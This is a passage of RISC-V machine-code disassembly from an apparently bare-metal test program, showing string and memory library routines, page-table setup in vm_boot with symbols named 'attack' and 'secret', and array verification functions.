    800080b8:	fb010113          	add	sp,sp,-80
    800080bc:	04813423          	sd	s0,72(sp)
    800080c0:	05010413          	add	s0,sp,80
    800080c4:	fca43423          	sd	a0,-56(s0)
    800080c8:	fcb43023          	sd	a1,-64(s0)
    800080cc:	fac43c23          	sd	a2,-72(s0)
    800080d0:	fc843703          	ld	a4,-56(s0)
    800080d4:	fc043783          	ld	a5,-64(s0)
    800080d8:	00f76733          	or	a4,a4,a5
    800080dc:	fb843783          	ld	a5,-72(s0)
    800080e0:	00f767b3          	or	a5,a4,a5
    800080e4:	0077f793          	and	a5,a5,7
    800080e8:	04079863          	bnez	a5,80008138 <memcpy+0x80>
    800080ec:	fc043783          	ld	a5,-64(s0)
    800080f0:	fef43423          	sd	a5,-24(s0)
    800080f4:	fc843783          	ld	a5,-56(s0)
    800080f8:	fef43023          	sd	a5,-32(s0)
    800080fc:	0240006f          	j	80008120 <memcpy+0x68>
    80008100:	fe843703          	ld	a4,-24(s0)
    80008104:	00870793          	add	a5,a4,8
    80008108:	fef43423          	sd	a5,-24(s0)
    8000810c:	fe043783          	ld	a5,-32(s0)
    80008110:	00878693          	add	a3,a5,8
    80008114:	fed43023          	sd	a3,-32(s0)
    80008118:	00073703          	ld	a4,0(a4)
    8000811c:	00e7b023          	sd	a4,0(a5)
    80008120:	fc843703          	ld	a4,-56(s0)
    80008124:	fb843783          	ld	a5,-72(s0)
    80008128:	00f707b3          	add	a5,a4,a5
    8000812c:	fe043703          	ld	a4,-32(s0)
    80008130:	fcf768e3          	bltu	a4,a5,80008100 <memcpy+0x48>
    80008134:	04c0006f          	j	80008180 <memcpy+0xc8>
    80008138:	fc043783          	ld	a5,-64(s0)
    8000813c:	fcf43c23          	sd	a5,-40(s0)
    80008140:	fc843783          	ld	a5,-56(s0)
    80008144:	fcf43823          	sd	a5,-48(s0)
    80008148:	0240006f          	j	8000816c <memcpy+0xb4>
    8000814c:	fd843703          	ld	a4,-40(s0)
    80008150:	00170793          	add	a5,a4,1
    80008154:	fcf43c23          	sd	a5,-40(s0)
    80008158:	fd043783          	ld	a5,-48(s0)
    8000815c:	00178693          	add	a3,a5,1
    80008160:	fcd43823          	sd	a3,-48(s0)
    80008164:	00074703          	lbu	a4,0(a4)
    80008168:	00e78023          	sb	a4,0(a5)
    8000816c:	fc843703          	ld	a4,-56(s0)
    80008170:	fb843783          	ld	a5,-72(s0)
    80008174:	00f707b3          	add	a5,a4,a5
    80008178:	fd043703          	ld	a4,-48(s0)
    8000817c:	fcf768e3          	bltu	a4,a5,8000814c <memcpy+0x94>
    80008180:	fc843783          	ld	a5,-56(s0)
    80008184:	00078513          	mv	a0,a5
    80008188:	04813403          	ld	s0,72(sp)
    8000818c:	05010113          	add	sp,sp,80
    80008190:	00008067          	ret

0000000080008194 <memset>:
    80008194:	fb010113          	add	sp,sp,-80
    80008198:	04813423          	sd	s0,72(sp)
    8000819c:	05010413          	add	s0,sp,80
    800081a0:	fca43423          	sd	a0,-56(s0)
    800081a4:	00058793          	mv	a5,a1
    800081a8:	fac43c23          	sd	a2,-72(s0)
    800081ac:	fcf42223          	sw	a5,-60(s0)
    800081b0:	fc843703          	ld	a4,-56(s0)
    800081b4:	fb843783          	ld	a5,-72(s0)
    800081b8:	00f767b3          	or	a5,a4,a5
    800081bc:	0077f793          	and	a5,a5,7
    800081c0:	08079263          	bnez	a5,80008244 <memset+0xb0>
    800081c4:	fc442783          	lw	a5,-60(s0)
    800081c8:	0ff7f793          	zext.b	a5,a5
    800081cc:	fcf43c23          	sd	a5,-40(s0)
    800081d0:	fd843783          	ld	a5,-40(s0)
    800081d4:	00879793          	sll	a5,a5,0x8
    800081d8:	fd843703          	ld	a4,-40(s0)
    800081dc:	00f767b3          	or	a5,a4,a5
    800081e0:	fcf43c23          	sd	a5,-40(s0)
    800081e4:	fd843783          	ld	a5,-40(s0)
    800081e8:	01079793          	sll	a5,a5,0x10
    800081ec:	fd843703          	ld	a4,-40(s0)
    800081f0:	00f767b3          	or	a5,a4,a5
    800081f4:	fcf43c23          	sd	a5,-40(s0)
    800081f8:	fd843783          	ld	a5,-40(s0)
    800081fc:	02079793          	sll	a5,a5,0x20
    80008200:	fd843703          	ld	a4,-40(s0)
    80008204:	00f767b3          	or	a5,a4,a5
    80008208:	fcf43c23          	sd	a5,-40(s0)
    8000820c:	fc843783          	ld	a5,-56(s0)
    80008210:	fef43423          	sd	a5,-24(s0)
    80008214:	0180006f          	j	8000822c <memset+0x98>
    80008218:	fe843783          	ld	a5,-24(s0)
    8000821c:	00878713          	add	a4,a5,8
    80008220:	fee43423          	sd	a4,-24(s0)
    80008224:	fd843703          	ld	a4,-40(s0)
    80008228:	00e7b023          	sd	a4,0(a5)
    8000822c:	fc843703          	ld	a4,-56(s0)
    80008230:	fb843783          	ld	a5,-72(s0)
    80008234:	00f707b3          	add	a5,a4,a5
    80008238:	fe843703          	ld	a4,-24(s0)
    8000823c:	fcf76ee3          	bltu	a4,a5,80008218 <memset+0x84>
    80008240:	03c0006f          	j	8000827c <memset+0xe8>
    80008244:	fc843783          	ld	a5,-56(s0)
    80008248:	fef43023          	sd	a5,-32(s0)
    8000824c:	01c0006f          	j	80008268 <memset+0xd4>
    80008250:	fe043783          	ld	a5,-32(s0)
    80008254:	00178713          	add	a4,a5,1
    80008258:	fee43023          	sd	a4,-32(s0)
    8000825c:	fc442703          	lw	a4,-60(s0)
    80008260:	0ff77713          	zext.b	a4,a4
    80008264:	00e78023          	sb	a4,0(a5)
    80008268:	fc843703          	ld	a4,-56(s0)
    8000826c:	fb843783          	ld	a5,-72(s0)
    80008270:	00f707b3          	add	a5,a4,a5
    80008274:	fe043703          	ld	a4,-32(s0)
    80008278:	fcf76ce3          	bltu	a4,a5,80008250 <memset+0xbc>
    8000827c:	fc843783          	ld	a5,-56(s0)
    80008280:	00078513          	mv	a0,a5
    80008284:	04813403          	ld	s0,72(sp)
    80008288:	05010113          	add	sp,sp,80
    8000828c:	00008067          	ret

0000000080008290 <strlen>:
    80008290:	fd010113          	add	sp,sp,-48
    80008294:	02813423          	sd	s0,40(sp)
    80008298:	03010413          	add	s0,sp,48
    8000829c:	fca43c23          	sd	a0,-40(s0)
    800082a0:	fd843783          	ld	a5,-40(s0)
    800082a4:	fef43423          	sd	a5,-24(s0)
    800082a8:	0100006f          	j	800082b8 <strlen+0x28>
    800082ac:	fe843783          	ld	a5,-24(s0)
    800082b0:	00178793          	add	a5,a5,1
    800082b4:	fef43423          	sd	a5,-24(s0)
    800082b8:	fe843783          	ld	a5,-24(s0)
    800082bc:	0007c783          	lbu	a5,0(a5)
    800082c0:	fe0796e3          	bnez	a5,800082ac <strlen+0x1c>
    800082c4:	fe843703          	ld	a4,-24(s0)
    800082c8:	fd843783          	ld	a5,-40(s0)
    800082cc:	40f707b3          	sub	a5,a4,a5
    800082d0:	00078513          	mv	a0,a5
    800082d4:	02813403          	ld	s0,40(sp)
    800082d8:	03010113          	add	sp,sp,48
    800082dc:	00008067          	ret

00000000800082e0 <strnlen>:
    800082e0:	fd010113          	add	sp,sp,-48
    800082e4:	02813423          	sd	s0,40(sp)
    800082e8:	03010413          	add	s0,sp,48
    800082ec:	fca43c23          	sd	a0,-40(s0)
    800082f0:	fcb43823          	sd	a1,-48(s0)
    800082f4:	fd843783          	ld	a5,-40(s0)
    800082f8:	fef43423          	sd	a5,-24(s0)
    800082fc:	0100006f          	j	8000830c <strnlen+0x2c>
    80008300:	fe843783          	ld	a5,-24(s0)
    80008304:	00178793          	add	a5,a5,1
    80008308:	fef43423          	sd	a5,-24(s0)
    8000830c:	fd043783          	ld	a5,-48(s0)
    80008310:	fff78713          	add	a4,a5,-1
    80008314:	fce43823          	sd	a4,-48(s0)
    80008318:	00078863          	beqz	a5,80008328 <strnlen+0x48>
    8000831c:	fe843783          	ld	a5,-24(s0)
    80008320:	0007c783          	lbu	a5,0(a5)
    80008324:	fc079ee3          	bnez	a5,80008300 <strnlen+0x20>
    80008328:	fe843703          	ld	a4,-24(s0)
    8000832c:	fd843783          	ld	a5,-40(s0)
    80008330:	40f707b3          	sub	a5,a4,a5
    80008334:	00078513          	mv	a0,a5
    80008338:	02813403          	ld	s0,40(sp)
    8000833c:	03010113          	add	sp,sp,48
    80008340:	00008067          	ret

0000000080008344 <strcmp>:
    80008344:	fd010113          	add	sp,sp,-48
    80008348:	02813423          	sd	s0,40(sp)
    8000834c:	03010413          	add	s0,sp,48
    80008350:	fca43c23          	sd	a0,-40(s0)
    80008354:	fcb43823          	sd	a1,-48(s0)
    80008358:	fd843783          	ld	a5,-40(s0)
    8000835c:	00178713          	add	a4,a5,1
    80008360:	fce43c23          	sd	a4,-40(s0)
    80008364:	0007c783          	lbu	a5,0(a5)
    80008368:	fef407a3          	sb	a5,-17(s0)
    8000836c:	fd043783          	ld	a5,-48(s0)
    80008370:	00178713          	add	a4,a5,1
    80008374:	fce43823          	sd	a4,-48(s0)
    80008378:	0007c783          	lbu	a5,0(a5)
    8000837c:	fef40723          	sb	a5,-18(s0)
    80008380:	fef44783          	lbu	a5,-17(s0)
    80008384:	0ff7f793          	zext.b	a5,a5
    80008388:	00078e63          	beqz	a5,800083a4 <strcmp+0x60>
    8000838c:	fef44783          	lbu	a5,-17(s0)
    80008390:	00078713          	mv	a4,a5
    80008394:	fee44783          	lbu	a5,-18(s0)
    80008398:	0ff77713          	zext.b	a4,a4
    8000839c:	0ff7f793          	zext.b	a5,a5
    800083a0:	faf70ce3          	beq	a4,a5,80008358 <strcmp+0x14>
    800083a4:	fef44783          	lbu	a5,-17(s0)
    800083a8:	0007871b          	sext.w	a4,a5
    800083ac:	fee44783          	lbu	a5,-18(s0)
    800083b0:	0007879b          	sext.w	a5,a5
    800083b4:	40f707bb          	subw	a5,a4,a5
    800083b8:	0007879b          	sext.w	a5,a5
    800083bc:	00078513          	mv	a0,a5
    800083c0:	02813403          	ld	s0,40(sp)
    800083c4:	03010113          	add	sp,sp,48
    800083c8:	00008067          	ret

00000000800083cc <strcpy>:
    800083cc:	fd010113          	add	sp,sp,-48
    800083d0:	02813423          	sd	s0,40(sp)
    800083d4:	03010413          	add	s0,sp,48
    800083d8:	fca43c23          	sd	a0,-40(s0)
    800083dc:	fcb43823          	sd	a1,-48(s0)
    800083e0:	fd843783          	ld	a5,-40(s0)
    800083e4:	fef43423          	sd	a5,-24(s0)
    800083e8:	00000013          	nop
    800083ec:	fd043703          	ld	a4,-48(s0)
    800083f0:	00170793          	add	a5,a4,1
    800083f4:	fcf43823          	sd	a5,-48(s0)
    800083f8:	fe843783          	ld	a5,-24(s0)
    800083fc:	00178693          	add	a3,a5,1
    80008400:	fed43423          	sd	a3,-24(s0)
    80008404:	00074703          	lbu	a4,0(a4)
    80008408:	00e78023          	sb	a4,0(a5)
    8000840c:	0007c783          	lbu	a5,0(a5)
    80008410:	fc079ee3          	bnez	a5,800083ec <strcpy+0x20>
    80008414:	fd843783          	ld	a5,-40(s0)
    80008418:	00078513          	mv	a0,a5
    8000841c:	02813403          	ld	s0,40(sp)
    80008420:	03010113          	add	sp,sp,48
    80008424:	00008067          	ret

0000000080008428 <atol>:
    80008428:	fd010113          	add	sp,sp,-48
    8000842c:	02813423          	sd	s0,40(sp)
    80008430:	03010413          	add	s0,sp,48
    80008434:	fca43c23          	sd	a0,-40(s0)
    80008438:	fe043423          	sd	zero,-24(s0)
    8000843c:	fe042223          	sw	zero,-28(s0)
    80008440:	0100006f          	j	80008450 <atol+0x28>
    80008444:	fd843783          	ld	a5,-40(s0)
    80008448:	00178793          	add	a5,a5,1
    8000844c:	fcf43c23          	sd	a5,-40(s0)
    80008450:	fd843783          	ld	a5,-40(s0)
    80008454:	0007c783          	lbu	a5,0(a5)
    80008458:	00078713          	mv	a4,a5
    8000845c:	02000793          	li	a5,32
    80008460:	fef702e3          	beq	a4,a5,80008444 <atol+0x1c>
    80008464:	fd843783          	ld	a5,-40(s0)
    80008468:	0007c783          	lbu	a5,0(a5)
    8000846c:	00078713          	mv	a4,a5
    80008470:	02d00793          	li	a5,45
    80008474:	00f70c63          	beq	a4,a5,8000848c <atol+0x64>
    80008478:	fd843783          	ld	a5,-40(s0)
    8000847c:	0007c783          	lbu	a5,0(a5)
    80008480:	00078713          	mv	a4,a5
    80008484:	02b00793          	li	a5,43
    80008488:	06f71c63          	bne	a4,a5,80008500 <atol+0xd8>
    8000848c:	fd843783          	ld	a5,-40(s0)
    80008490:	0007c783          	lbu	a5,0(a5)
    80008494:	0007871b          	sext.w	a4,a5
    80008498:	02d00793          	li	a5,45
    8000849c:	40f707b3          	sub	a5,a4,a5
    800084a0:	0017b793          	seqz	a5,a5
    800084a4:	0ff7f793          	zext.b	a5,a5
    800084a8:	fef42223          	sw	a5,-28(s0)
    800084ac:	fd843783          	ld	a5,-40(s0)
    800084b0:	00178793          	add	a5,a5,1
    800084b4:	fcf43c23          	sd	a5,-40(s0)
    800084b8:	0480006f          	j	80008500 <atol+0xd8>
    800084bc:	fe843703          	ld	a4,-24(s0)
    800084c0:	00070793          	mv	a5,a4
    800084c4:	00279793          	sll	a5,a5,0x2
    800084c8:	00e787b3          	add	a5,a5,a4
    800084cc:	00179793          	sll	a5,a5,0x1
    800084d0:	fef43423          	sd	a5,-24(s0)
    800084d4:	fd843783          	ld	a5,-40(s0)
    800084d8:	00178713          	add	a4,a5,1
    800084dc:	fce43c23          	sd	a4,-40(s0)
    800084e0:	0007c783          	lbu	a5,0(a5)
    800084e4:	0007879b          	sext.w	a5,a5
    800084e8:	fd07879b          	addw	a5,a5,-48
    800084ec:	0007879b          	sext.w	a5,a5
    800084f0:	00078713          	mv	a4,a5
    800084f4:	fe843783          	ld	a5,-24(s0)
    800084f8:	00e787b3          	add	a5,a5,a4
    800084fc:	fef43423          	sd	a5,-24(s0)
    80008500:	fd843783          	ld	a5,-40(s0)
    80008504:	0007c783          	lbu	a5,0(a5)
    80008508:	fa079ae3          	bnez	a5,800084bc <atol+0x94>
    8000850c:	fe442783          	lw	a5,-28(s0)
    80008510:	0007879b          	sext.w	a5,a5
    80008514:	00078863          	beqz	a5,80008524 <atol+0xfc>
    80008518:	fe843783          	ld	a5,-24(s0)
    8000851c:	40f007b3          	neg	a5,a5
    80008520:	0080006f          	j	80008528 <atol+0x100>
    80008524:	fe843783          	ld	a5,-24(s0)
    80008528:	00078513          	mv	a0,a5
    8000852c:	02813403          	ld	s0,40(sp)
    80008530:	03010113          	add	sp,sp,48
    80008534:	00008067          	ret

0000000080008538 <lfsr63>:
    80008538:	fd010113          	add	sp,sp,-48
    8000853c:	02813423          	sd	s0,40(sp)
    80008540:	03010413          	add	s0,sp,48
    80008544:	fca43c23          	sd	a0,-40(s0)
    80008548:	fd843783          	ld	a5,-40(s0)
    8000854c:	0017d713          	srl	a4,a5,0x1
    80008550:	fd843783          	ld	a5,-40(s0)
    80008554:	00f747b3          	xor	a5,a4,a5
    80008558:	0017f793          	and	a5,a5,1
    8000855c:	fef43423          	sd	a5,-24(s0)
    80008560:	fd843783          	ld	a5,-40(s0)
    80008564:	0017d713          	srl	a4,a5,0x1
    80008568:	fe843783          	ld	a5,-24(s0)
    8000856c:	03e79793          	sll	a5,a5,0x3e
    80008570:	00f767b3          	or	a5,a4,a5
    80008574:	00078513          	mv	a0,a5
    80008578:	02813403          	ld	s0,40(sp)
    8000857c:	03010113          	add	sp,sp,48
    80008580:	00008067          	ret

0000000080008584 <vm_boot>:
    80008584:	fe010113          	add	sp,sp,-32
    80008588:	00813c23          	sd	s0,24(sp)
    8000858c:	02010413          	add	s0,sp,32
    80008590:	ffffb797          	auipc	a5,0xffffb
    80008594:	a7078793          	add	a5,a5,-1424 # 80003000 <pt+0x1000>
    80008598:	00c7d793          	srl	a5,a5,0xc
    8000859c:	00a79793          	sll	a5,a5,0xa
    800085a0:	0017e713          	or	a4,a5,1
    800085a4:	ffffa797          	auipc	a5,0xffffa
    800085a8:	a5c78793          	add	a5,a5,-1444 # 80002000 <pt>
    800085ac:	00e7b823          	sd	a4,16(a5)
    800085b0:	ffffa717          	auipc	a4,0xffffa
    800085b4:	a5070713          	add	a4,a4,-1456 # 80002000 <pt>
    800085b8:	000017b7          	lui	a5,0x1
    800085bc:	00f707b3          	add	a5,a4,a5
    800085c0:	20000737          	lui	a4,0x20000
    800085c4:	0cf70713          	add	a4,a4,207 # 200000cf <threadsense.2+0x2000004b>
    800085c8:	00e7b023          	sd	a4,0(a5) # 1000 <threadsense.2+0xf7c>
    800085cc:	001f8797          	auipc	a5,0x1f8
    800085d0:	a3478793          	add	a5,a5,-1484 # 80200000 <attack>
    800085d4:	00c7d793          	srl	a5,a5,0xc
    800085d8:	00a79713          	sll	a4,a5,0xa
    800085dc:	001f8797          	auipc	a5,0x1f8
    800085e0:	a2478793          	add	a5,a5,-1500 # 80200000 <attack>
    800085e4:	0157d793          	srl	a5,a5,0x15
    800085e8:	1ff7f793          	and	a5,a5,511
    800085ec:	0cb76713          	or	a4,a4,203
    800085f0:	ffffa697          	auipc	a3,0xffffa
    800085f4:	a1068693          	add	a3,a3,-1520 # 80002000 <pt>
    800085f8:	20078793          	add	a5,a5,512
    800085fc:	00379793          	sll	a5,a5,0x3
    80008600:	00f687b3          	add	a5,a3,a5
    80008604:	00e7b023          	sd	a4,0(a5)
    80008608:	ffffc797          	auipc	a5,0xffffc
    8000860c:	9f878793          	add	a5,a5,-1544 # 80004000 <pt+0x2000>
    80008610:	00c7d793          	srl	a5,a5,0xc
    80008614:	00a79713          	sll	a4,a5,0xa
    80008618:	003f8797          	auipc	a5,0x3f8
    8000861c:	9e878793          	add	a5,a5,-1560 # 80400000 <data>
    80008620:	0157d793          	srl	a5,a5,0x15
    80008624:	1ff7f793          	and	a5,a5,511
    80008628:	00176713          	or	a4,a4,1
    8000862c:	ffffa697          	auipc	a3,0xffffa
    80008630:	9d468693          	add	a3,a3,-1580 # 80002000 <pt>
    80008634:	20078793          	add	a5,a5,512
    80008638:	00379793          	sll	a5,a5,0x3
    8000863c:	00f687b3          	add	a5,a3,a5
    80008640:	00e7b023          	sd	a4,0(a5)
    80008644:	005f8797          	auipc	a5,0x5f8
    80008648:	9bc78793          	add	a5,a5,-1604 # 80600000 <conflict>
    8000864c:	00c7d793          	srl	a5,a5,0xc
    80008650:	00a79713          	sll	a4,a5,0xa
    80008654:	005f8797          	auipc	a5,0x5f8
    80008658:	9ac78793          	add	a5,a5,-1620 # 80600000 <conflict>
    8000865c:	0157d793          	srl	a5,a5,0x15
    80008660:	1ff7f793          	and	a5,a5,511
    80008664:	0c776713          	or	a4,a4,199
    80008668:	ffffa697          	auipc	a3,0xffffa
    8000866c:	99868693          	add	a3,a3,-1640 # 80002000 <pt>
    80008670:	20078793          	add	a5,a5,512
    80008674:	00379793          	sll	a5,a5,0x3
    80008678:	00f687b3          	add	a5,a3,a5
    8000867c:	00e7b023          	sd	a4,0(a5)
    80008680:	ffffd797          	auipc	a5,0xffffd
    80008684:	98078793          	add	a5,a5,-1664 # 80005000 <pt+0x3000>
    80008688:	00c7d793          	srl	a5,a5,0xc
    8000868c:	00a79713          	sll	a4,a5,0xa
    80008690:	007f8797          	auipc	a5,0x7f8
    80008694:	97078793          	add	a5,a5,-1680 # 80800000 <secret>
    80008698:	0157d793          	srl	a5,a5,0x15
    8000869c:	1ff7f793          	and	a5,a5,511
    800086a0:	00176713          	or	a4,a4,1
    800086a4:	ffffa697          	auipc	a3,0xffffa
    800086a8:	95c68693          	add	a3,a3,-1700 # 80002000 <pt>
    800086ac:	20078793          	add	a5,a5,512
    800086b0:	00379793          	sll	a5,a5,0x3
    800086b4:	00f687b3          	add	a5,a3,a5
    800086b8:	00e7b023          	sd	a4,0(a5)
    800086bc:	007f8797          	auipc	a5,0x7f8
    800086c0:	94478793          	add	a5,a5,-1724 # 80800000 <secret>
    800086c4:	00c7d793          	srl	a5,a5,0xc
    800086c8:	00a79793          	sll	a5,a5,0xa
    800086cc:	0c77e713          	or	a4,a5,199
    800086d0:	ffffa697          	auipc	a3,0xffffa
    800086d4:	93068693          	add	a3,a3,-1744 # 80002000 <pt>
    800086d8:	000037b7          	lui	a5,0x3
    800086dc:	00f687b3          	add	a5,a3,a5
    800086e0:	00e7b023          	sd	a4,0(a5) # 3000 <threadsense.2+0x2f7c>
    800086e4:	003f8797          	auipc	a5,0x3f8
    800086e8:	91c78793          	add	a5,a5,-1764 # 80400000 <data>
    800086ec:	00c7d793          	srl	a5,a5,0xc
    800086f0:	00a79713          	sll	a4,a5,0xa
    800086f4:	003f8797          	auipc	a5,0x3f8
    800086f8:	90c78793          	add	a5,a5,-1780 # 80400000 <data>
    800086fc:	00c7d793          	srl	a5,a5,0xc
    80008700:	1ff7f793          	and	a5,a5,511
    80008704:	0c776713          	or	a4,a4,199
    80008708:	ffffa697          	auipc	a3,0xffffa
    8000870c:	8f868693          	add	a3,a3,-1800 # 80002000 <pt>
    80008710:	40078793          	add	a5,a5,1024
    80008714:	00379793          	sll	a5,a5,0x3
    80008718:	00f687b3          	add	a5,a3,a5
    8000871c:	00e7b023          	sd	a4,0(a5)
    80008720:	003f9797          	auipc	a5,0x3f9
    80008724:	8e078793          	add	a5,a5,-1824 # 80401000 <data1>
    80008728:	00c7d793          	srl	a5,a5,0xc
    8000872c:	00a79713          	sll	a4,a5,0xa
    80008730:	003f9797          	auipc	a5,0x3f9
    80008734:	8d078793          	add	a5,a5,-1840 # 80401000 <data1>
    80008738:	00c7d793          	srl	a5,a5,0xc
    8000873c:	1ff7f793          	and	a5,a5,511
    80008740:	0c776713          	or	a4,a4,199
    80008744:	ffffa697          	auipc	a3,0xffffa
    80008748:	8bc68693          	add	a3,a3,-1860 # 80002000 <pt>
    8000874c:	40078793          	add	a5,a5,1024
    80008750:	00379793          	sll	a5,a5,0x3
    80008754:	00f687b3          	add	a5,a3,a5
    80008758:	00e7b023          	sd	a4,0(a5)
    8000875c:	003fa797          	auipc	a5,0x3fa
    80008760:	8a478793          	add	a5,a5,-1884 # 80402000 <data2>
    80008764:	00c7d793          	srl	a5,a5,0xc
    80008768:	00a79713          	sll	a4,a5,0xa
    8000876c:	003fa797          	auipc	a5,0x3fa
    80008770:	89478793          	add	a5,a5,-1900 # 80402000 <data2>
    80008774:	00c7d793          	srl	a5,a5,0xc
    80008778:	1ff7f793          	and	a5,a5,511
    8000877c:	00176713          	or	a4,a4,1
    80008780:	ffffa697          	auipc	a3,0xffffa
    80008784:	88068693          	add	a3,a3,-1920 # 80002000 <pt>
    80008788:	40078793          	add	a5,a5,1024
    8000878c:	00379793          	sll	a5,a5,0x3
    80008790:	00f687b3          	add	a5,a3,a5
    80008794:	00e7b023          	sd	a4,0(a5)
    80008798:	00800793          	li	a5,8
    8000879c:	fef43423          	sd	a5,-24(s0)
    800087a0:	fe843783          	ld	a5,-24(s0)
    800087a4:	03c79713          	sll	a4,a5,0x3c
    800087a8:	ffffa797          	auipc	a5,0xffffa
    800087ac:	85878793          	add	a5,a5,-1960 # 80002000 <pt>
    800087b0:	00c7d793          	srl	a5,a5,0xc
    800087b4:	00f767b3          	or	a5,a4,a5
    800087b8:	fef43023          	sd	a5,-32(s0)
    800087bc:	fe043783          	ld	a5,-32(s0)
    800087c0:	18079073          	csrw	satp,a5
    800087c4:	0000b7b7          	lui	a5,0xb
    800087c8:	1557879b          	addw	a5,a5,341 # b155 <threadsense.2+0xb0d1>
    800087cc:	30279073          	csrw	medeleg,a5
    800087d0:	12000073          	sfence.vma
    800087d4:	00000013          	nop
    800087d8:	01813403          	ld	s0,24(sp)
    800087dc:	02010113          	add	sp,sp,32
    800087e0:	00008067          	ret

00000000800087e4 <printArray>:
    800087e4:	fd010113          	add	sp,sp,-48
    800087e8:	02813423          	sd	s0,40(sp)
    800087ec:	03010413          	add	s0,sp,48
    800087f0:	fea43423          	sd	a0,-24(s0)
    800087f4:	00058793          	mv	a5,a1
    800087f8:	fcc43c23          	sd	a2,-40(s0)
    800087fc:	fef42223          	sw	a5,-28(s0)
    80008800:	00000013          	nop
    80008804:	02813403          	ld	s0,40(sp)
    80008808:	03010113          	add	sp,sp,48
    8000880c:	00008067          	ret

0000000080008810 <printDoubleArray>:
    80008810:	fd010113          	add	sp,sp,-48
    80008814:	02813423          	sd	s0,40(sp)
    80008818:	03010413          	add	s0,sp,48
    8000881c:	fea43423          	sd	a0,-24(s0)
    80008820:	00058793          	mv	a5,a1
    80008824:	fcc43c23          	sd	a2,-40(s0)
    80008828:	fef42223          	sw	a5,-28(s0)
    8000882c:	00000013          	nop
    80008830:	02813403          	ld	s0,40(sp)
    80008834:	03010113          	add	sp,sp,48
    80008838:	00008067          	ret

000000008000883c <verify>:
    8000883c:	fb010113          	add	sp,sp,-80
    80008840:	04813423          	sd	s0,72(sp)
    80008844:	05010413          	add	s0,sp,80
    80008848:	00050793          	mv	a5,a0
    8000884c:	fcb43023          	sd	a1,-64(s0)
    80008850:	fac43c23          	sd	a2,-72(s0)
    80008854:	fcf42623          	sw	a5,-52(s0)
    80008858:	fe042623          	sw	zero,-20(s0)
    8000885c:	0c80006f          	j	80008924 <verify+0xe8>
    80008860:	fec42783          	lw	a5,-20(s0)
    80008864:	00279793          	sll	a5,a5,0x2
    80008868:	fc043703          	ld	a4,-64(s0)
    8000886c:	00f707b3          	add	a5,a4,a5
    80008870:	0007a783          	lw	a5,0(a5)
    80008874:	fef42423          	sw	a5,-24(s0)
    80008878:	fec42783          	lw	a5,-20(s0)
    8000887c:	00178793          	add	a5,a5,1
    80008880:	00279793          	sll	a5,a5,0x2
    80008884:	fc043703          	ld	a4,-64(s0)
    80008888:	00f707b3          	add	a5,a4,a5
    8000888c:	0007a783          	lw	a5,0(a5)
    80008890:	fef42223          	sw	a5,-28(s0)
    80008894:	fec42783          	lw	a5,-20(s0)
    80008898:	00279793          	sll	a5,a5,0x2
    8000889c:	fb843703          	ld	a4,-72(s0)
    800088a0:	00f707b3          	add	a5,a4,a5
    800088a4:	0007a783          	lw	a5,0(a5)
    800088a8:	fef42023          	sw	a5,-32(s0)
    800088ac:	fec42783          	lw	a5,-20(s0)
    800088b0:	00178793          	add	a5,a5,1
    800088b4:	00279793          	sll	a5,a5,0x2
    800088b8:	fb843703          	ld	a4,-72(s0)
    800088bc:	00f707b3          	add	a5,a4,a5
    800088c0:	0007a783          	lw	a5,0(a5)
    800088c4:	fcf42e23          	sw	a5,-36(s0)
    800088c8:	fe842783          	lw	a5,-24(s0)
    800088cc:	00078713          	mv	a4,a5
    800088d0:	fe042783          	lw	a5,-32(s0)
    800088d4:	0007071b          	sext.w	a4,a4
    800088d8:	0007879b          	sext.w	a5,a5
    800088dc:	00f70a63          	beq	a4,a5,800088f0 <verify+0xb4>
    800088e0:	fec42783          	lw	a5,-20(s0)
    800088e4:	0017879b          	addw	a5,a5,1
    800088e8:	0007879b          	sext.w	a5,a5
    800088ec:	0b80006f          	j	800089a4 <verify+0x168>
    800088f0:	fe442783          	lw	a5,-28(s0)
    800088f4:	00078713          	mv	a4,a5
    800088f8:	fdc42783          	lw	a5,-36(s0)
    800088fc:	0007071b          	sext.w	a4,a4
    80008900:	0007879b          	sext.w	a5,a5
    80008904:	00f70a63          	beq	a4,a5,80008918 <verify+0xdc>
    80008908:	fec42783          	lw	a5,-20(s0)
    8000890c:	0027879b          	addw	a5,a5,2
    80008910:	0007879b          	sext.w	a5,a5
    80008914:	0900006f          	j	800089a4 <verify+0x168>
    80008918:	fec42783          	lw	a5,-20(s0)
    8000891c:	0027879b          	addw	a5,a5,2
    80008920:	fef42623          	sw	a5,-20(s0)
    80008924:	fcc42783          	lw	a5,-52(s0)
    80008928:	01f7d71b          	srlw	a4,a5,0x1f
    8000892c:	00f707bb          	addw	a5,a4,a5
    80008930:	4017d79b          	sraw	a5,a5,0x1
    80008934:	0007879b          	sext.w	a5,a5
    80008938:	0017979b          	sllw	a5,a5,0x1
    8000893c:	0007871b          	sext.w	a4,a5
    80008940:	fec42783          	lw	a5,-20(s0)
    80008944:	0007879b          	sext.w	a5,a5
    80008948:	f0e7cce3          	blt	a5,a4,80008860 <verify+0x24>
    8000894c:	fcc42783          	lw	a5,-52(s0)
    80008950:	0017f793          	and	a5,a5,1
    80008954:	0007879b          	sext.w	a5,a5
    80008958:	04078463          	beqz	a5,800089a0 <verify+0x164>
    8000895c:	fcc42783          	lw	a5,-52(s0)
    80008960:	00279793          	sll	a5,a5,0x2
    80008964:	ffc78793          	add	a5,a5,-4
    80008968:	fc043703          	ld	a4,-64(s0)
    8000896c:	00f707b3          	add	a5,a4,a5
    80008970:	0007a783          	lw	a5,0(a5)
    80008974:	0007869b          	sext.w	a3,a5
    80008978:	fcc42783          	lw	a5,-52(s0)
    8000897c:	00279793          	sll	a5,a5,0x2
    80008980:	ffc78793          	add	a5,a5,-4
    80008984:	fb843703          	ld	a4,-72(s0)
    80008988:	00f707b3          	add	a5,a4,a5
    8000898c:	0007a783          	lw	a5,0(a5)
    80008990:	00068713          	mv	a4,a3
    80008994:	00f70663          	beq	a4,a5,800089a0 <verify+0x164>
    80008998:	fcc42783          	lw	a5,-52(s0)
    8000899c:	0080006f          	j	800089a4 <verify+0x168>
    800089a0:	00000793          	li	a5,0
    800089a4:	00078513          	mv	a0,a5
    800089a8:	04813403          	ld	s0,72(sp)
    800089ac:	05010113          	add	sp,sp,80
    800089b0:	00008067          	ret

00000000800089b4 <verifyDouble>:
    800089b4:	fa010113          	add	sp,sp,-96
    800089b8:	04813c23          	sd	s0,88(sp)
    800089bc:	06010413          	add	s0,sp,96
    800089c0:	00050793          	mv	a5,a0
    800089c4:	fab43823          	sd	a1,-80(s0)
    800089c8:	fac43423          	sd	a2,-88(s0)
    800089cc:	faf42e23          	sw	a5,-68(s0)
